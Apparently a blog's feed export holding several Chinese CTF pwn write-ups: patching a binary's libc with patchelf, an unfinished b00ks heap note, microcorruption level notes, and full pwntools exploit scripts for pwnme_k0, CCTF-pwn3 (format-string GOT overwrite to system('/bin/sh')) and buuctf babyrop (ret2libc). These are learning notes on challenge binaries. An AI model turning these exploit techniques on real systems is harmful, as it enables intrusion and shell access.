    <content type="html"><![CDATA[<p>一开始并不了解需要更改程序libc库使之与本机适配，在b00ks那题耽误了非常多时间，这里记录一下修改libc过程中学到的一些东西和过程。</p><p>0.首先需要理解好关于动态链接依赖库的认识<a href="https://zhuanlan.zhihu.com/p/59590848%E3%80%81%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E3%80%8B%E7%AC%AC%E5%85%AB%E7%AB%A0%E3%80%82">https://zhuanlan.zhihu.com/p/59590848、《程序员的自我修养》第八章。</a></p><p>1.为什么要修改libc库</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/1.png"></p><p>这里的libc.so.6是一个软连接，表示该程序依赖于libc.so.2.x.x版本的libc，后面的路径指向本地该版本libc的地址，ld则是链接器的地址，但由于本地使用的libc与靶机libc版本不一样，导致脚本在不同系统上运行时会造成某些地址变化，然后出错，因此需要下载一个与靶机相同的libc版本，使该程序的软链接指向适配靶机的libc版本，这样在本地调试与远程调试时才能有正确的结果。</p><p>2、应该修改为什么libc版本</p><p>修改为靶机使用的libc版本，或题目给出的libc文件版本。</p><p>3、操作</p><p>①本题在buuctf上进行，题目原文件并没有给出libc版本，而在buuctf上使用的靶机为ubuntu16，对应使用的libc文件可在网站上下载，查看libc文件的版本号，由于有libc版本还不够，还需要相对应的ld进行动态链接，因此需要通过libc-all-in-one来下载该libc版本对应的ld。</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/2.png"></p><p>②安装glibc-all-in-one </p><p>直接看README就ok，这里主要记录一下这个报错和解决方法</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/3.png"></p><p>直接update失败，报错说不支持py2，用py3运行一下就ok。</p><p>③cat list查看所有版本号</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/4.png"></p><p>找到相同的版本号，这里的amd64是64位系统用的，i386是32位系统用的，根据系统的位数来选。</p><p>下载</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/5.png"></p><p>在该文件夹中就能找到这个版本的所有文件，将其中的ld复制到题目所在文件夹下。</p><p>④安装patchelf 可以直接apt install patchelf</p><p>⑤使用patchelf</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/6.png"></p><p>ldd可以查看程序原本依赖的库地址</p><p>更改程序libc与ld版本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">patchelf <span class="hljs-params">--set-interpreter</span> <span class="hljs-string">./ld-2.23.so</span> <span class="hljs-string">./b00ks</span> <br>patchelf <span class="hljs-params">--replace-needed</span> libc.so.6 <span class="hljs-string">./libc-2.23.so</span> <span class="hljs-string">./b00ks</span><br>                          旧版本      新版本<br></code></pre></td></tr></table></figure><p>新的路径</p><p><img src="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/8.png"></p><p>参考资料：</p><p><a href="https://blog.csdn.net/huzai9527/article/details/118558784">https://blog.csdn.net/huzai9527/article/details/118558784</a></p><p><a href="https://lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">https://lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/</a></p>]]></content>
    
    
    <categories>
      
      <category>智能学习机器人</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>b00ks</title>
    <link href="/2021/08/31/b00ks/"/>
    <url>/2021/08/31/b00ks/</url>
    
    <content type="html"><![CDATA[<p>这道题是我在接触堆以后学习的第一道题，先大概看了一遍wiki里面堆和ptmalloc的前置知识，其实吸收得不是很好，做题的时候遇到了很多基础性的问题，所以看题解和自己调试花了非常多时间，我会把一些我解决的非常基础的问题也记录下来。</p><hr><p>这题做到一半发现偏移地址不太对，才知道堆题大多数都需要更换程序链接的libc，因为不太了解libc链接机制，顺便又把《程序员的自我修养》后面几章给看完了。这题在wiki上没有提供libc版本，又因为我对patchelf原理不太熟悉，导致我在这里卡了很久，后面是到buuctf上打，有提供libc版本。</p><p>在我的另一篇博客记录了更换libc的过程</p><hr><p>首先是应该看ida，都知道漏洞是出在自定义read函数上，它这里多输入了一个数，且自增后将指针指向的值修改为0，这就是溢出了单字节。</p><p><img src="/2021/08/31/b00ks/1.png"></p><p>然后是create book的数据结构，是在这一段</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3 = malloc(0x20u<span class="hljs-class">LL);</span><br>         <span class="hljs-built_in"> if </span>( v3 )<br>          &#123;<br>            *((_DWORD *)v3 + 6) = v1;//==*((_QWORD *)v3 + 3) = v1;<br>            //des_size<br>            *((_QWORD *)off_202010 + v2) = v3;//把book指针放到author_name后或前一个book后<br>            *((_QWORD *)v3 + 2) = v5;//des_ptr<br>            *((_QWORD *)v3 + 1) = ptr;//name_ptr<br>            *(_DWORD *)v3 = ++unk_202024;//id<br>           <span class="hljs-built_in"> return </span>0<span class="hljs-class">LL;</span><br>          &#125;<br></code></pre></td></tr></table></figure><p>那么我们用gdb一步一步调试分析利用</p><p>1、由于第一步操作是输入author_name，所以这里溢出的单字节会被后面放入的指针覆盖，所以随便写点就可以，这里写入‘A’*32。</p><p>2、create两个book，并且第二个book分配较大内存以便后续利用（如0x21000），查看内存分析结构，这里开启了PIE，所以关闭一下ASLR，这样会同时使PIE无法启用，调试更方便。</p><p><img src="/2021/08/31/b00ks/2.png" alt="用search找到author name的位置"></p><p>查看author name地址中的内容</p><p><img src="/2021/08/31/b00ks/3.png"></p><p>这里的book由于是不确定的空间大小，根据c语言的结构体，这里会分配一个指向book内存的指针放在这个结构内，也是上面*((_QWORD *)off_202010 + v2) &#x3D; v3;的结果，因此这里是指向book1内存的指针，然后进入这个指针观察。</p><p><img src="/2021/08/31/b00ks/4.png"></p><p>那么回到author name的内存，因为后面紧跟着book1 ptr，因此溢出的单字节可以对book1 ptr进行修改，由于小端序，会将最后两位修改为00，这时候我们修改一下author_name，就可以覆盖book1的最后一位，修改后的地址刚好在book1_des的内容里面，就可以在book1_des里伪造一个fake_chunk，由于ASLR，每次运行程序的地址都不一样，我们在fake_chunk里放入当下book2的内容地址并且泄露出来，就可以计算出根据libc和mmap分配内存的固定偏移，这样在重新运行的时候就能根据固定偏移算出libcbase，从而修改free_hook为system函数。</p><p><img src="/2021/08/31/b00ks/6.png"></p><p>注意这里我写入了payload&#x3D;p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)以后发现它有些移位，这是book1大小不同导致的，所以前面要填充一部分deadbeef使fake_chunk刚好在这个指针指向的内存上，而这也是book1不能设置太大的原因，否则单字节覆盖后的指针不一定会指向book1_des内的空间。</p><p><img src="/2021/08/31/b00ks/5.png"></p><p>这里看到libc_base是0x7fddf35b2000，而输出book1_name得到的内容是book2_name_ptr，输出book1_des得到的内容是book2_des_ptr，这里的book2_des_ptr为0x00007fddf356e010</p><p>到这里遇到了一点问题不能继续，我会在查阅资料后完善这篇文章。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnme_k0</title>
    <link href="/2021/08/13/pwnme-k0/"/>
    <url>/2021/08/13/pwnme-k0/</url>
    
    <content type="html"><![CDATA[<p>先分析下程序和保护，开了RELRO，不能改got地址</p><p><img src="/2021/08/13/pwnme-k0/1.png"></p><p>分析程序，发现第一个register只要第一位不为48就可以跳过。</p><p>跳过以后发现漏洞主要在Show命令里的两个printf，格式化字符串漏洞。且程序中含有system（）函数。</p><p><img src="/2021/08/13/pwnme-k0/2.png"></p><p>那么我们的思路就是：先edit，输入两个格式化字符串泄露栈中存储返回地址的地址，再修改内容为system（）函数的地址，这样函数返回时就会调用system（）。</p><p>接下来是我主要的分析和学习的知识点：</p><p><img src="/2021/08/13/pwnme-k0/4.png"></p><p><img src="/2021/08/13/pwnme-k0/3.png"></p><p>找了一些资料解决我对偏移、指针一类的疑惑，我大概是如上图这样理解的。</p><p>0x400D74是show函数运行完后跳转的地址，因此它相对于show函数的帧顶的偏移是不变的，我们可以直接泄露出存储该返回地址的地址，即上图0x…dd08，利用%n修改0x…dd08地址中的值。</p><p>1、确定格式化字符串的偏移</p><p>64位系统中，函数前六个参数在寄存器中，则printf的第一个参数为格式化字符串，往后则是格式化字符串的参数，前五个均在寄存器中，然后从栈开始数。这里要注意的是，上图第一行为栈指针，而第二行为printf函数的帧顶，函数的参数应该在自己所在帧中提取，即第2、3、4行则是格式化字符串的第6、7、8个参数，所以格式化本身的偏移为8。</p><p>2、为什么不直接%2214d%7$hn?</p><p>%n的作用为，把已经成功输出的字符个数写入对应的整型指针参数所指的变量。那么在这里，整型指针指该栈地址，变量地址则为0x400d74，写入变量就变成了修改地址0x400d74所指向的内容，而不是修改0x400d74这个地址本身了。</p><p>先将ret_addr泄露，写入栈中的位置，此时变量则为储存返回地址的空间，再利用%n就可以改变该空间内的值从而修改返回地址。</p><p>3、为什么不能直接往username中输入p64（ret）+b‘%2214d%8$hn’</p><p>我不知道，想不明白，以后学到更多的时候再回来想想。</p><p>exp</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs dart">from pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;11111&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;11111&#x27;</span>)<br>p.recv()<br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;%6<span class="hljs-subst">$p</span>&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;111&#x27;</span>)<br>p.recv()<br><br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>ret=<span class="hljs-built_in">int</span>(p.recvline().strip(),<span class="hljs-number">16</span>)<span class="hljs-number">-0x38</span><br>success(<span class="hljs-string">&quot;ret_addr:&quot;</span>+hex(ret))<br>p.recv()<br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recv()<br>p.sendline(p64(ret))<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;%2218d%8<span class="hljs-subst">$hn</span>&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CCTF-pwn3</title>
    <link href="/2021/07/26/CCTF-pwn3/"/>
    <url>/2021/07/26/CCTF-pwn3/</url>
    
    <content type="html"><![CDATA[<p>先checksec</p><p><img src="/2021/07/26/CCTF-pwn3/1.png"></p><p>看ida的第一步，首先应该输入正确的usrname，这里需要对输入的每一个字母的ascii码都加一，然后与sysbdmin进行strcmp，因此，我们输入的字符串应该是rxraclhm。</p><p><img src="/2021/07/26/CCTF-pwn3/2.png"></p><p>这里dest就被存入了sysbdmin的内容。</p><p>接下来是输入命令，这份博客把各函数内容说得很详细了<a href="https://www.cnblogs.com/yuren123/p/12748559.html%EF%BC%8C%E6%88%91%E4%BB%AC%E9%9B%86%E4%B8%AD%E5%85%B3%E6%B3%A8get_file%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84fmtstr%E6%BC%8F%E6%B4%9E">https://www.cnblogs.com/yuren123/p/12748559.html，我们集中关注get_file函数中的fmtstr漏洞</a></p><p><img src="/2021/07/26/CCTF-pwn3/4.png"></p><p>通过对其他函数的分析，程序通过指针实现存储文件的功能，每个文件的文件头大小为40，文件内容大小为200，在get_file函数中，输入需要打印的文件的文件名，将文件内容复制至dest指针指向的空间并直接printf，基本思路是将payload通过put_file输入其中一个文件中，然后使用get_file函数利用fmtstr进行利用。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>//通过第一道认证<br>p.recvuntil(<span class="hljs-string">&#x27;nism):&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;rxraclhm&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_file</span>(<span class="hljs-params">name,content</span>):<br>    p.sendline(<span class="hljs-string">&quot;put&quot;</span>)<br>    p.recv()<br>    p.sendline(name)<br>    p.recv()<br>    p.sendline(content)<br>    p.recv()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">output_file</span>(<span class="hljs-params">name</span>):<br>    p.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>    p.recv()<br>    p.sendline(name)<br><br>//泄露puts_got里的内容，及puts函数在该程序中的真正地址<br>input_file(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;%8$s&#x27;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>output_file(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>//recv的内容前<span class="hljs-number">4</span>个小端序字符为puts函数地址，后面的字符均为格式化字符串中%s后面的内容<br>puts_addr=u32(p.recv()[:<span class="hljs-number">4</span>])<br>log.success(<span class="hljs-string">&#x27;puts got:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>//使用libcSearcher找到system函数的真正地址<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span> ,puts_addr)<br>system_offset=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>system_addr=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)+system_offset<br><br>//自动生成payload，这里的格式化字符串属于printf函数的第<span class="hljs-number">7</span>个参数<br>payload=fmtstr_payload(<span class="hljs-number">7</span>, &#123;elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]: system_addr&#125;)<br>input_file(<span class="hljs-string">&#x27;1&#x27;</span>,payload)<br>output_file(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recv()<br>log.success(<span class="hljs-string">&#x27;sys_addr:&#x27;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br><br>//输入一个文件名为/<span class="hljs-built_in">bin</span>/sh;的文件，当show_dir时会运行puts(/<span class="hljs-built_in">bin</span>/sh;)，即system(/<span class="hljs-built_in">bin</span>/sh;)<br>input_file(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>知识点</p><p>1、字符串偏移计算</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">input<span class="hljs-constructor">_file(&#x27;1&#x27;,&#x27;AAAA%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>&#x27;)</span><br>output<span class="hljs-constructor">_file(&#x27;1&#x27;)</span><br>print(p.recv<span class="hljs-literal">()</span>)<br></code></pre></td></tr></table></figure><p><img src="/2021/07/26/CCTF-pwn3/5.png"></p><p>即第七个。</p><p>2、libcsearcher的使用，不知道什么原因无法直接使用，提示no moudle named ‘libcsearcher’，上网搜到的方法没能解决，将程序与py文件复制到&#x2F;libcsearcher下后可正常使用。</p><p>3、关于got表，在看了一些书和资料后大概明白，在程序地址随机化时，函数的got地址指向的空间内存着函数在该程序中真正的地址，因此</p><p>①泄露时%p泄露的是got地址，%s泄露的是got地址指向的内容，即真正地址。</p><p>②使用libcsearcher进行配对的是got地址，got地址与libc库有关，而函数真正地址会随机化。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记录我对我的虚拟机都做了些什么</title>
    <link href="/2021/07/13/%E8%AE%B0%E5%BD%95%E6%88%91%E5%AF%B9%E6%88%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%83%BD%E5%81%9A%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/"/>
    <url>/2021/07/13/%E8%AE%B0%E5%BD%95%E6%88%91%E5%AF%B9%E6%88%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%83%BD%E5%81%9A%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<p>7.13 </p><p>更改nat模式</p><p>设置proxychains4，修改了conf文件</p><p>修改了Firefox代理设置</p><p>7.26</p><p>修改了gdbinit文件，使pwndbg可以使用pwngdb功能</p><p>9.22</p><p>使用apt安装libc时提示404 not found，解决方法apt update</p><p>10.10</p><p>复制需要的libc版本内的.debug文件夹到另一个路径，并更改了gdb-file</p><p><code>set debug-file-directory debug/</code></p><p>2021.1.24</p><p>更新公钥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">sudo gpg <span class="hljs-comment">--keyserver pgpkeys.mit.edu --recv-key 467B942D3A79BD29</span><br>sudo gpg -<span class="hljs-keyword">a</span> <span class="hljs-comment">--export 467B942D3A79BD29 | sudo apt-key add - </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>microcorruption</title>
    <link href="/2021/05/26/microcorruption/"/>
    <url>/2021/05/26/microcorruption/</url>
    
    <content type="html"><![CDATA[<p>前两题忘记记下来了，反正很容易就不写了</p><h2 id="Sydney"><a href="#Sydney" class="headerlink" title="Sydney"></a>Sydney</h2><h4 id><a href="#" class="headerlink" title></a><img src="/2021/05/26/microcorruption/1.png"></h4><p>这里是逐一比较，一开始按照顺序来写不对，卡了一下，看了题解应该是数据存储应该是高位在后面，就是要6750倒过来写5067，很容易忘记的基础知识点了orz。</p><h2 id="Hanoi"><a href="#Hanoi" class="headerlink" title="Hanoi"></a>Hanoi</h2><p><img src="/2021/05/26/microcorruption/2.png"></p><p>这里是要比较0x2e和0x2410地址里的东西是否一样，一样就可以过，前面可以随便填</p><h2 id="Cusco"><a href="#Cusco" class="headerlink" title="Cusco"></a>Cusco</h2><p><img src="/2021/05/26/microcorruption/3.png"></p><p>不能让r15&#x3D;0，就往前面函数看看</p><p><img src="/2021/05/26/microcorruption/4.png"></p><p>不管前面输入什么，到这两句r15都会变为0，因此不能单纯靠写答案过这题，看了看题解应该是要用栈溢出来操作。</p><p><img src="/2021/05/26/microcorruption/5.png"></p><p>当执行到login函数的ret指令时，sp处于我们可以覆盖的位置，因此可以把这个位置写成我们需要跳转的地址<unlock_door>0x4446,因此选择16位输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644，就过啦！</unlock_door></p><h2 id="Reykjavik"><a href="#Reykjavik" class="headerlink" title="Reykjavik"></a>Reykjavik</h2><p>照例输入aaaaaaaaaaaa运行一下，当sp运行到password开始的地方，留意汇编指令</p><p><img src="/2021/05/26/microcorruption/10.png"></p><p>这里需要比较0x6cd1和0x43fe-0x24&#x3D;0x43da的内容，也就是password的第一组数字，因此password先直接输d16c，然后就发现过了。</p><p>其实这一题做的时候并没有这么简单，当时是发现了程序的汇编码在内存里面，只能一条一条去看，并且看见enc的函数名，以为是要一条一条解密的，后来实在撂不清2400后面的程序整个的逻辑，去找了题解顺着做才发现这条重要指令，对汇编指令还是不够敏感，还得继续努力orz。</p><h2 id="Whitehorse"><a href="#Whitehorse" class="headerlink" title="Whitehorse"></a>Whitehorse</h2><p>这道题出现栈溢出的地方是程序最后的ret那里</p><p><img src="/2021/05/26/microcorruption/13.png"></p><p>因为之前习惯于在最后判定结果前找漏洞，找这个ret找了很久，最后是在栈溢出的地方填需要跳转的地址，这里没有unlock函数，但是在conditional_xxx函数里有一个call<int>，我们可以填充参数0x7f进去，就能unlock。</int></p><h2 id="Montevideo"><a href="#Montevideo" class="headerlink" title="Montevideo"></a>Montevideo</h2><p>跟上一题是一模一样的。</p><h2 id="Johannesburg"><a href="#Johannesburg" class="headerlink" title="Johannesburg"></a>Johannesburg</h2><p><img src="/2021/05/26/microcorruption/14.png"></p><p>这里是一个cananry，因此sp+11地址的值应该等于30，才能绕过，同时填充我们要的返回地址0x4446就行。</p><h2 id="Santa-Cruz"><a href="#Santa-Cruz" class="headerlink" title="Santa Cruz"></a>Santa Cruz</h2><p><img src="/2021/05/26/microcorruption/15.png"></p><p>这里不能使之为0，一步一步推。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-babyrop</title>
    <link href="/2021/04/22/buuctf-babyrop/"/>
    <url>/2021/04/22/buuctf-babyrop/</url>
    
    <content type="html"><![CDATA[<p>先checksec</p><p><img src="/2021/04/22/buuctf-babyrop/1.png"></p><p>然后ida，为了自己看起来清晰改了下函数名。</p><p><img src="/2021/04/22/buuctf-babyrop/2.png"></p><p>第一个是计时函数，超过时间就会退出程序。第二个函数如图</p><p><img src="/2021/04/22/buuctf-babyrop/3.png"></p><p>这里我们要做的是在read buf的时候，第一个字符为\0，这样后面的strncmp的v1就是0，就能成功return buf[7]，在第三个函数中，就可以read的字符数为buf[7]，buf的大小是231，要令他栈溢出，就要让buf[7]的值大于231，那么如何才能让一个char值大于231……困扰了我一下，还是看别人的wp，然后才发现原来可以直接输入‘\255’[手动狗头]，又学到了许多。</p><p>然后是找system和binsh，毫无意外的并没有，并且题目附件还给了libc文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;i386&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-attribute">sl</span>=lambda x:io.sendline(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><br><span class="hljs-comment">#io=remote(&#x27;node3.buuoj.cn&#x27;,27293)</span><br><span class="hljs-attribute">io</span>=process(&#x27;./pnn&#x27;)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pnn&#x27;)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc-2.23.so&#x27;)<br><br><span class="hljs-attribute">main</span>=0x8048825<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;\0&#x27;</span>*7+&#x27;\255&#x27;<br>sl(payload)#<br>rl()#<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe7+4)+p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(main)+p32(1)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(4)<br>sl(payload)<br><br><span class="hljs-attribute">write_got</span>=u32(io.recv(4))<br><span class="hljs-attribute">libc_base</span>=write_got-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;\0&#x27;</span>*7+&#x27;\255&#x27;<br>sl(payload)#<br>rl()#<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe7+4)+p32(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(0)+p32(libc_base+libc.search(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>).next())<br>sl(payload)<br>gdb.attach(io)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>libc.search(‘&#x2F;bin&#x2F;sh\0’).next()中的next()是因为search会出来不止一个，我们只需要第一个，所以用next()</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>收藏一些网站</title>
    <link href="/2021/04/20/%E6%94%B6%E8%97%8F%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/"/>
    <url>/2021/04/20/%E6%94%B6%E8%97%8F%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/</url>
    
